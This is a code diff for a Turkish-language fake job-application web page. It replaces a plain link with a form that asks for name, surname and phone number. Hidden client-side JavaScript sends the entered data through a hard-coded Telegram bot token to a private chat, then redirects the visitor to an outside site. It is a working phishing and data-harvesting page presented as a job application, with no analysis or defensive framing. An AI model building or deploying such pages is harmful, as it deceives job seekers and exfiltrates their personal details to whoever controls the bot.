@@ -39,6 +39,14 @@
             color: #555;
         }
 
+        input[type="text"], input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+
         .apply-button {
             background-color: #4CAF50;
             color: white;
@@ -59,10 +67,46 @@
 <body>
     <div class="container">
         <h1>İş İlanına Başvuru Yap</h1>
-        <p>Bu iş ilanı için başvuru yapmak istiyorsanız aşağıdaki butona tıklayın.</p>
-        <a href="https://trjojo.net/" target="_blank">
-            <button class="apply-button">Başvuru Yap</button>
-        </a>
+        <p>Bu iş ilanı için başvuru yapmak istiyorsanız aşağıdaki bilgileri doldurun ve başvuru butonuna tıklayın.</p>
+
+        <form id="applicationForm">
+            <input type="text" id="firstName" placeholder="Adınız" required>
+            <input type="text" id="lastName" placeholder="Soyadınız" required>
+            <input type="tel" id="phone" placeholder="Telefon Numaranız" required>
+
+            <button type="submit" class="apply-button">Başvuru Yap</button>
+        </form>
     </div>
+
+    <script>
+        document.getElementById('applicationForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Formun sayfayı yenilemesini engeller.
+
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const phone = document.getElementById('phone').value;
+
+            // Telegram bot API URL
+            const token = '7648795693:AAE4pMeYZLDD-XeR0Jg9F0gnZEyuBSwCiBg';
+            const chatId = '-4622909638';
+            const message = `Başvuru Yapıldı:\nAd: ${firstName}\nSoyad: ${lastName}\nTelefon: ${phone}`;
+
+            // Telegram'a veri gönderme
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        // Başvuru başarılı, kullanıcıyı yönlendirme
+                        window.location.href = "https://trjojo.net/";
+                    } else {
+                        alert('Başvuru gönderilemedi. Lütfen tekrar deneyin.');
+                    }
+                })
+                .catch(error => {
+                    alert('Bir hata oluştu. Lütfen tekrar deneyin.');
+                    console.error('Error:', error);
+                });
+        });
+    </script>
 </body>
 </html>
